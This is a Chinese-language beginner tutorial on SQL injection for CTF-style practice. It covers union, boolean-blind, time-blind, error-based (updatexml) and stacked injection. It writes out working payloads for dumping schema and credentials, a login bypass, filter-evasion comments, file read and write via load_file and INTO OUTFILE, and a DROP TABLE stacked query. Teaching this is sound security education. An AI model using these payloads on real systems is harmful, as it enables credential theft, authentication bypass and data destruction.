---
comments: true

---
## SQL注入入门

### 简介 

就不说奇奇怪怪书面语言了，大致意思就是通过可控输入点达到非预期执行数据库语句，这里的非预期指的是，拼接相应的语句可以拿到数据库里面的其他数据，具体看下面的Demo。

比如下面的语句：

```php
$sql = "SELECT username,password FROM users WHERE id = ".$_GET["id"];
```

对于他的预期操作，一般一个id是用来索引的,传入的值应该是：

```php
$_GET["id"] = 1;
$_GET["id"] = 2;
```

所以预期执行的语句应该是：

```php
$sql = "SELECT username,password FROM users WHERE id =  1";
$sql = "SELECT username,password FROM users WHERE id =  2";
......
```

在没有过滤的情况下，我们能够在后面拼接我们自己的语句

比如，我们传入的值：

```php
$_GET["id"] ="1 union select username,password from user"
```

那么最后执行的语句就是：

```php
$sql = "SELECT username,password FROM users WHERE id = 1 union select username,password from user;"
```

![image-20230426163533547](https://nssctf.wdf.ink//img/WDTJ/202304261635588.png)

这样就造成了非预期语句的执行，我们在获得 `users` 表中的预期数据的同时也获得了 `users` 表中的非预期数据。

当你看到这时，不需要对语句有具体了解，但你需要知道SQL注入是一个怎么样的过程。

下面我们从数据库基础——结构 基本语法开始 一步一步引到您学会基础的SQL注入。

### SQL数据库基础

#### 数据库结构基础

![image-20230426164654561](https://nssctf.wdf.ink//img/WDTJ/202304261646646.png)

![image-20230426165200366](https://nssctf.wdf.ink//img/WDTJ/202304261652391.png)

如图所示 数据库 为层级结构：

```
+数据库 ( database )
+ - 表_user ( table_user )
+ - 表_users ( table_users )
+ + - 列_id (column_id)
+ + - 列_username (column_username)
+ + - 列_password (column_password)
+ + + - 数据
+ + + - 数据
```

#### 数据库语法基础

常用语法：

- `SELECT`

```sql
SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件
```

- `UNION`

  ```sql
  SELECT 列名 FROM 表名
  UNION
  SELECT 列名_1 FROM 表名_1;
  ```

​		注意 使用 `UNION` 的时候要注意两个表的列数量必须相同。  

- `LIMIT`

- ```SQL
   #返回表中前number行数据
  SELECT column1, column2, ... FROM table_name LIMIT number;
  #从offset+1行开始返回row_count行数据
  SELECT column1, column2, ... FROM table_name LIMIT offset, row_count; 
  #比如 LIMIT 10, 10 返回11-20行数据
  ```
  
- ```SQL
  SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;
  ```

- `注释`

  ```sql
  SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释
  ```

  ```sql
  DROP sampletable;# 后面的内容都将被注释
  ```
  
  ```sql
    DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格
    #/*中间的内容都将被注释*/
  ```

  ```sql
    SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在
  ```

- `Order by`

  ```sql
  SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];
  ```
  
  其中，column1、column2等表示要查询的列名，table_name表示要查询的表名，condition表示查询条件，column_name表示要按照哪一列进行排序，ASC或DESC表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。
  
  ```SQL
  # 在SQL注入中我们常用它来判断列数
  SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错
  SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错
  SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错
  ```

常用参数：

- `user()`：当前数据库用户
- `database()`：当前数据库名
- `version()`：当前使用的数据库版本
- `@@datadir`：数据库存储数据路径
- `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`
- `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
- `concat_ws()`：用法类似
- `hex()` 和 `unhex()`：用于 hex 编码解码
- `ASCII()`：返回字符的 ASCII 码值
- `CHAR()`：把整数转换为对应的字符
- `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`
- `select xxoo into outfile '路径'`：权限较高时可直接写文件

### 基础注入类型

#### 注入类型判断
> 讲课的时候发现这一章节之前没有解释如何判断注入类型,遂在此补充。

在开始前，我们需要理解一个SQL注入中最常用的词汇 —— **构造闭合** 。
对于SQL处理语句后台的写法:

```sql
SELECT username,password FROM users WHERE id = ?
```
这里的问号可以有多种的闭合方式, `$id`, `'$id'`, `"$id"`, `($id)`。  

以及多种变换形式:`((((((((((("'$id'")))))))))))`（雾  

那么什么是构造闭合呢？  

已知我们可控的输入点是 ？也就是 $id , 当我们的输入与开发者后台设置的语句的 `'` `"` `(` 配对  

比如后台为:   

```sql
SELECT username,password FROM users WHERE id = "$id"
```
那么我们使传入的$id = '1"',那么后台执行则为  
```sql
SELECT username,password FROM users WHERE id = "1" "
```
在这里我们对1完成了闭合构造，但是我们闭合了前序导致后续的 `"` 没有双引号配对，多出来的这个双引号则会导致报错：  
```sql
1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1
```
所以我们通常在构造完闭合后去注释掉后面的符号，比如使用 `#` `-- `。  

上面是白盒下面很直观的版本，但是大多数情况下，SQL注入都是黑盒，我们不知道后台到底是怎么写的，所以我们需要一些判断的方法或者技巧。  

**通过是否报错**  

比如，我们使用 `1'` 进行试探:   

| 后台实际输入 | 执行语句                                              | 是否报错 以及 相关解释                                       |
| ------------ | ----------------------------------------------------- | ------------------------------------------------------------ |
| `"1'"`       | `SELECT username,password FROM users WHERE id = "1'"` | `""` 中为可以包含 `'` ，而 `1'` 是一个合法的字符串,在查询时会先被强制类型转换为数字，**不会报错** |
| `1'`         | `SELECT username,password FROM users WHERE id = 1'`   | 这里的 `'` 就没有闭合，**会报错**。                          |
| `'1''`       | `SELECT username,password FROM users WHERE id = '1''` | 这里的 `'`与前序的`'` 闭合了但这样就留下了后序单着的 `'`，**会报错**。 |

**通过报错信息**

>  注：我们省略了部分语句和相同的报错。
>
> `SELECT username,password FROM users WHERE id = "1"";`  -> id=xx
>
> `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1`
>
> -> `near '1'' at line 1`

| 输入 | 后台执行    | 后台报错                | 解释                                                         |
| ---- | ----------- | ----------------------- | ------------------------------------------------------------ |
| `1"` | `id = "1""` | `near '"1""' at line 1` | 去掉外层SQL的单引号，留下`"1""`，除去自己的输入 `1"`可知类型为 **双引号** 的 **字符型注入** |
| `1'` | `id = '1''` | `near ''1''' at line 1` | 同理，留下`'1''`除去自己的输入 `1'`可知类型为 **单引号** 的 **字符型注入** |
| `'1` | `id = ''1'` | `near '1'' at line 1`   | 对于后台SQL，由于`id = ''`已经合法闭合，所以后面`1'`反而为多出的语句，所以报错点在`1'` |

#### 数字型注入

我们开局举的例子就是一个很典型的数字型注入。

```php
$sql = "SELECT username,password FROM users WHERE id = ".$_GET["id"];
```

我们可用理解为两个部分 原有语句 `SELECT username,password FROM users WHERE id = `和用户输入部分`$_GET["id"]`。

前面我们说到，这种语句一般用于用户输入id来索引查询，所以预期的输入都是数字，所以直接采用的直接拼接的方式，以数字的方式进行查询。

然而，用户的输入因为没有过滤的缘故，不管输入什么都会直接拼接到后面，所以我们可用用下面的步骤逐步得到数据库信息：

- 使用 `Order by` 确定列数，方便后续注入。

  ```SQL
  id = 1 Order by 1;
  id = 1 Order by 2;
  id = 1 Order by 3; # 报错 确定列数为 2 
  ```

- 使用联合查询 `union` 基于 `information_schema` 拿到数据库名

  ```SQL
  1 union SELECT 1,schema_name FROM information_schema.schemata;
  # or
  1 union SELECT schema_name,2 FROM information_schema.schemata;
  # 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。
  # 此时后台执行为:
  SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;
  ```

​		![image-20230426195745130](https://nssctf.wdf.ink//img/WDTJ/202304261957162.png)

​		也可以把1换成其他的，比如`database()` 这样我们可以知道我们当前在哪个数据库

​		![image-20230426195952638](https://nssctf.wdf.ink//img/WDTJ/202304261959665.png)

- 下面就是用联合查询得到数据库里面的表名，一般步骤我们都是先获取当前库 ( `database()` ) 的表，再去看其他库的。

  这里我们基于`UNION` `GROUP_CONCAT(table_name)` 和 `information_schema.tables`

  ```sql
  1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
  1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()
  # 原理同上
  # 如果要查询其他数据库 可以写为 where table_schema='databaseNAME'
  # 后台执行为：
  SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()
  ```

  ![image-20230426201306290](https://nssctf.wdf.ink//img/WDTJ/202304262013324.png)

- 下面就是去获得 表 的对应字段名 方便我们最后一步的查询工作

  这里我们使用`UNION` `GROUP_CONCAT(column_name)` 和 `information_schema.columns`

  ```sql
  1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()
  1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()
  # 后台执行为：
  SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();
  ```

  ![image-20230426202627021](https://nssctf.wdf.ink//img/WDTJ/202304262026058.png)

#### 字符型注入

下面我们假设一个登录系统，那么他会接收两个参数 用户名和密码 后台的查询语句可能这样写

```sql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

对于这种，开发时，预期数据收到的参数都为字符，使用字符进行查询的数据库的注入漏洞 我们称为字符型注入。

与数字型不同的是，我们需要先构造单引号的闭合。

这里我们让 `$username `= `-1' or '1'='1' -- `

```sql
SELECT * FROM users WHERE username='-1' or '1'='1' -- ' AND password='$password';
```

![image-20230426203250434](https://nssctf.wdf.ink//img/WDTJ/202304262032468.png)

就可以使`Where`的条件永真,直接输出`SELECT * FROM users`的所有内容。

同样，与数字型的注入方式类似，我们也可以使用联合查询的方法来获取数据库信息。

`order by `判断列数

```sql
SELECT * FROM users WHERE username='-1' or '1'='1' order by 1-- ' AND password='$password';
SELECT * FROM users WHERE username='-1' or '1'='1' order by 2-- ' AND password='$password';
SELECT * FROM users WHERE username='-1' or '1'='1' order by 3-- ' AND password='$password';
SELECT * FROM users WHERE username='-1' or '1'='1' order by 4-- ' AND password='$password'; # 报错
```



![image-20230426213252233](https://nssctf.wdf.ink//img/WDTJ/202304262132275.png)

那么接下来就和数字型注入相同 吧 `order by NUM` 换成对应的语句即可：

- 库名

```sql
SELECT * FROM users WHERE username='-1' or '1'='1' union SELECT 1,schema_name,2 FROM information_schema.schemata;-- ' AND password='$password';
```

- 表名

```sql
SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- ' AND password='$password';
```

- 字段名


```sql
SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- ' AND password='$password';
```

### 盲注

盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。

我们还是以下面的句子为例子，不过相比于之前的不同，我们规定用户的查询没有回显，所以仅靠上面的方式我们无法获得数据，所以我们选用盲注。

```php
$sql = "SELECT username,password FROM users WHERE id = ".$_GET["id"];
```

#### 布尔盲注

对于上述语句，如果id的传参如下：

```sql
id = 1 AND 1=1
```

那么语句执行为：

```sql
SELECT username,password FROM users WHERE id = 1 AND 1=1;
```

![image-20230504191135714](https://nssctf.wdf.ink//img/WDTJ/202305041911785.png)

这里会要求两个条件为真，一是有`id=1`这个值，二是 `1=1`，这两个条件当然是满足的，特别是后面的这个条件。

那如果我让AND后面的条件为 `1 = 2`：

```sql
SELECT username,password FROM users WHERE id = 1 AND '1'='2';
# 这里 '1' = '2'，1 = 2 效果都是一样的
```

![image-20230504191548610](https://nssctf.wdf.ink//img/WDTJ/202305041915652.png)

可以看到返回为空，因为AND后面的条件不满足。

那么利用这个AND符号我们可以尝试下面的一些方式来获取信息：

- 使用 length(）获取长度信息

比如，我们用 length(）函数去爆破数据长度

```sql
id = 1 AND length(username)= NUM
```

那么语句执行为：

```sql
SELECT username,password FROM users WHERE id = 1 AND length(username)=1;
```



![image-20230504192130407](https://nssctf.wdf.ink//img/WDTJ/202305041921180.png)

当然 枚举长度的方式效率属实难蚌，我们可以使用大于小于符号 基于二分算法进行爆破：

```sql
id = 1 AND length(username)< NUM
id = 1 AND length(username)> NUM
```

这样效率会高很多。

- `SUBSTR()`函数用于截取字符串中的一部分。利用`SUBSTR()`函数，逐步截取数据库中的某个数据：

  `SUBSTR(string, start, length)` 其中，`string`表示要截取的字符串，`start`表示截取的起始位置，`length`表示截取的长度。`SUBSTR()`函数会从字符串的`start`位置开始，截取指定长度的字符。

  ```sql
  1 AND SUBSTR(username,1,1) = '?'
  ```

  那么语句执行为：

  ```sql
  SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,1,1) = '?';
  ```

  ![image-20230504211550827](https://nssctf.wdf.ink//img/WDTJ/202305042115906.png)

  ```sql
  SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,2,1) = 'd';
  ```

  

  ![image-20230504212127894](https://nssctf.wdf.ink//img/WDTJ/202305042121944.png)

  通过前部分长度的获取，结合 `substr()` 就可以对一个具体的字符数据进行fuzz了。

  这里推荐编写脚本来完成这样繁琐的工作。

  除了上述用法 `SUBSTR()`函数还可以用于替换字符串中的某个字符：

  ```sql
  UPDATE users SET username=SUBSTR(username,1,3)||'***'||SUBSTR(username,7) WHERE username='admin'
  ```

  面的SQL语句的作用是将管理员账户的用户名中的第4到第6个字符替换为`***`

  通过对该函数的组合使用，可以在不使用联合注入和依赖可视回显的方式拿到对应数据：

  ```sql
  SELECT username,password FROM users WHERE id = 1 AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'
  ```

- `MID()`函数也是用于截取字符串的函数。

  `MID(string, start, length)` 

  ```sql
  MID("Hello, World!", 1, 5) # 返回的结果为"Hello"；
  SUBSTR("Hello, World!", 1, 5) # 返回的结果为"Hello"。
  ```

- `CONCAT()`

  `CONCAT()`函数用于将多个字符串连接成一个字符串。

  ```sql
  CONCAT(string1, string2, ...)
  ```

  ```sql
  SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,'-',password),1 from users;
  ```

  ![image-20230504221859903](https://nssctf.wdf.ink//img/WDTJ/202305042218959.png)

  而在盲注中，我们通常用其的连接功能减少查询跳转。

#### 时间盲注

其实和布尔差不多，只不过是利用SQL语句的执行时间来判断SQL语句的真假，从而逐步推断出数据库中的数据。

下面是一些常用函数 和使用技巧：

- `IF()`

  `IF()`函数是一种条件判断函数，它用于判断指定条件是否成立，并根据判断结果返回不同的值.

  ```sql
  IF(condition, value_if_true, value_if_false)
  ```

  其中，`condition`表示要判断的条件，`value_if_true`表示条件成立时要返回的值，`value_if_false`表示条件不成立时要返回的值。如果条件成立，`IF()`函数将返回`value_if_true`，否则将返回`value_if_false`

- `SLEEP()`

  `SLEEP()` 函数是时间盲注的核心，其语法为 `SLEEP(seconds)`

  当语句被执行时，程序将会暂停指定秒数，比如下面的例子：

  通常 `IF` 和 `SLEEP` 两函数会一起使用

  ```sql
  SELECT * FROM users WHERE username='admin' AND IF(SLEEP(5),1,0)
  ```

  如果数据库中不存在用户名为`admin`的用户，那么该语句将会立即返回结束；否则，程序将会暂停5秒钟后再返回结果。

  同样我们使用我们的demo语句，`SELECT username,password FROM users WHERE id =`来演示：

  - 利用延时函数，如`SLEEP()`函数或者`BENCHMARK()`函数，来判断是否注入成功。

  ```sql
  SELECT username,password FROM users WHERE id = 1 AND IF(ASCII(SUBSTR(username,1,1))=97,SLEEP(5),0)
  ```

  如果用户表中的第一个用户名字符为字母`a`，则程序会暂停5秒钟，否则返回0。

  - 利用时间戳

  可以利用数据库中的时间戳函数，如`UNIX_TIMESTAMP()`函数来构造延时语句，如：

  ```sql
  SELECT username,password FROM users WHERE id = 1 AND IF(UNIX_TIMESTAMP()>1620264296,SLEEP(5),0)
  ```

  上述SQL语句的意思是：如果当前时间戳大于`1620264296`，则程序会暂停5秒钟，否则返回0。

  - 利用函数返回值

  可以利用函数的返回值，如`LENGTH()`函数、`SUBSTR()`函数等，来判断是否注入成功。例如：

  ```sql
  SELECT username,password FROM users WHERE id = 1 AND IF(LENGTH(username)=4,SLEEP(5),0)
  ```

  上述SQL语句的意思是：如果用户名的长度为4，则程序会暂停5秒钟，否则返回0。

- `BENCHMARK()`

  `BENCHMARK()`函数是一种用于重复执行指定语句的函数，在MySQL等数据库中支持使用。`BENCHMARK()`函数的语法通常如下：

  ```sql
  BENCHMARK(count,expr)
  ```

  其中，`count`表示要重复执行的次数，`expr`表示要重复执行的语句。

  看这个例子：

  ```sql
  SELECT * FROM users WHERE username='admin' AND IF(BENCHMARK(10,MD5('test')),1,0)
  ```

  如果数据库中不存在用户名为`admin`的用户，那么该语句将会立即返回；否则，程序将会重复执行`MD5('test')`函数10次后再返回结果

### 报错注入

顾名思义，通过报错信息获取数据的方法。

- `updatexml() ` 

  这里我们先讲 `updatexml() ` 报错注入。
  
  `updatexml()` 是MySQL中的一种XML处理函数，它用于更新XML格式的数 据，其标准的用法如下：
  
  ```sql
  UPDATEXML(xml_target, xpath_expr, new_value)
  ```
  
  其中，`xml_target`是要更新的XML数据，`xpath_expr`是要更新的节点路 径，`new_value`是新的节点值。
  
  但是这个函数有一个缺陷，如果二个参数包含特殊符号时会报错，并且会第二  个参数的内容显示在报错信息中
  
  ```
  mysql> SELECT username, password FROM users WHERE id = 1 and    updatexml(1, 0x7e, 3);
  1105 - XPATH syntax error: '~'
  ```
  
  那么通过这个特性，我们用 `concat()` 函数 将查询语句和特殊符号拼接 在一起，就可以将查询结果显示在报错信息中
  
  ```sql
  SELECT username, password FROM users WHERE id = 1 and updatexml(1, concat(0x7e,version()), 3) 
  ```
  
  输出:
  
  ```sql
  mysql> SELECT username, password FROM users WHERE id = 1 and  updatexml(1, concat(0x7e,version()), 3);
  1105 - XPATH syntax error: '~8.0.12'
  ```
  
  不过要注意的是 `updatexml() ` 的报错长度存在字符长度限制，目前有两  种方法来解决这个问题：
  
  - `LIMIT()` 
  
  ```sql
  SELECT username, password FROM users WHERE id = 1 and   updatexml(1,concat(0x7e,
  (select username from users 
  limit 1,1)),
  3);
  # 不断改变limit NUM,1 的值逐行获取
  ```
  
  ![image-20230505011056626](https://nssctf.wdf.ink//img/WDTJ/202305050110708.png)
  
  - `substr()`
  ```sql
  SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,
  substr(
  (select group_concat(username) from users),
  1,31)
  ),3);
  ```
  
    执行结果：
  
  ```sql
  mysql> SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,
  substr(
  (select group_concat(username) from users),1,31)
  ),3);
  1105 - XPATH syntax error: '~admin,super,flag,null'
  ```
  
  利用利用上述特性，我们可以下面的语句获取信息：
  
  获取所有数据库
  
  ```SQL
  SELECT username, password FROM users WHERE id = 1 and
  updatexml(1,concat('~',
          substr( 
                  (select group_concat(schema_name)
                  from information_schema.schemata)
          , 1 , 31)
  ),3)
  ```
  
  获取所有表
  
  ```SQL
  SELECT username, password FROM users WHERE id = 1 and
  updatexml(1,concat('~',
          substr( 
                  (select group_concat(table_name)
                  from information_schema.tables
                  where table_schema = 'security')
          , 1 , 31)
  ),3)
  ```
  
  获取所有字段
  
  ```SQL
  SELECT username, password FROM users WHERE id = 1 and
  updatexml(1,concat('~',
          substr( 
                  (select group_concat(column_name)
                  from information_schema.columns
                  where table_schema = 'security' and table_name = 'users')
          , 1 , 31)
  ),3)
  ```

- `extractvalue()`

  `extractvalue()`是MySQL中的一个XML处理函数，它用于从XML格式的数据中提取指定节点的值。

  正常情况下他的语法如下：

  ```sql
  EXTRACTVALUE(xml_target, xpath_expr)
  ```

  其中，`xml_target`是要提取节点值的XML数据，`xpath_expr`是要提取的节点路径。

  它用于报错注入的方法其实和 `updatexml() `  函数的使用方法差不多 但是参数少一个x

  ![image-20230505015028726](https://nssctf.wdf.ink//img/WDTJ/202305050150790.png)

而且报错信息长度限制也和`updatexml()` 一样，所以这里就不多做赘述。

- `floor() `
- `exp()`

### 堆叠注入

顾名思义x 一堆 SQL语句(多条)一起执行方法被称为堆叠注入。

其实讲原理就很容易懂：

在执行SQL语句时，如果SQL语句中包含多个SQL语句，数据库服务器会依次执行这些SQL语句，从而导致多次SQL注入攻击。通过在SQL语句中使用分号（;）来分隔多个SQL语句，从而实现堆叠注入攻击。

举个栗子：

```sql
SELECT username, password FROM users WHERE id =1; DROP TABLE users;--
```

执行这个SQL语句时，数据库服务器会依次执行这两个SQL语句，将会查询到`users`表中的用户名和密码，并且将`users`表删除。

### 了解更多
当你阅读完本文后，并且在SQL数据库中完成对应的复现操作，那么不出意外的话，你已经掌握了SQL注入的基本原理和基本操作，接下来你便可以自由的去探索更多的SQL注入技巧。
链接：[CTF-Wiki SQL注入](https://ctf-wiki.org/web/sqli/)